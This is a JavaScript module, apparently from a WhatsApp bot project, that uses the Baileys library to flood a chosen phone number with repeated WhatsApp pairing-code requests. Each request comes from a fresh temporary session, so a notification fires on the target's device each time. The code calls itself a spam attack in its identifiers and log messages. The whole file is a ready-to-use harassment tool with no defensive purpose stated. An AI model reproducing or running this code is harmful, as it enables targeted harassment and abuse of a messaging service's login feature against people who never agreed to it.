const { default: Wasi_Tech, useMultiFileAuthState, Browsers, delay } = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require('fs');

/**
 * Sends a single pairing code request to a target number.
 * Each request uses a new, temporary session to avoid conflicts.
 * @param {string} targetNumber - The full WhatsApp number with country code.
 */
async function sendSinglePairRequest(targetNumber) {
    const id = 'spam-' + Math.random().toString(36).substring(2, 8);
    const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
    let sock;
    try {
        sock = Wasi_Tech({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            browser: Browsers.macOS("Desktop"),
        });

        // We only need to request the pairing code, not establish a full connection.
        // This is sufficient to trigger the notification on the target's device.
        if (!sock.authState.creds.registered) {
            await delay(1500); // Allow time for initialization
            await sock.requestPairingCode(targetNumber);
            console.log(`[SPAM] Pairing code request sent to ${targetNumber}.`);
        }
    } catch (e) {
        console.error(`[SPAM-ERROR] Failed to send pairing request to ${targetNumber}:`, e);
    } finally {
        // Clean up the session immediately after the request.
        if (sock) {
            sock.ws.close();
        }
        if (fs.existsSync('./temp/' + id)) {
            fs.rmSync('./temp/' + id, { recursive: true, force: true });
        }
    }
}

/**
 * Initiates the spamming process by sending multiple pairing requests.
 * @param {string} targetNumber - The full WhatsApp number with country code.
 * @param {number} count - The number of pairing requests to send.
 */
async function startSpamming(targetNumber, count = 15) {
    console.log(`[SPAM-ATTACK] Initiating pairing spam for ${targetNumber} with ${count} requests.`);
    const promises = [];
    for (let i = 0; i < count; i++) {
        // We don't await each one individually in the loop to send them more rapidly.
        // A small delay is added to avoid overwhelming the local machine.
        promises.push(sendSinglePairRequest(targetNumber));
        await delay(300); // 300ms delay between starting each request
    }

    await Promise.allSettled(promises);
    console.log(`[SPAM-ATTACK] Finished spamming ${targetNumber}.`);
    return `Spamming complete. Sent ${count} pairing requests to ${targetNumber}.`;
}

module.exports = { startSpamming };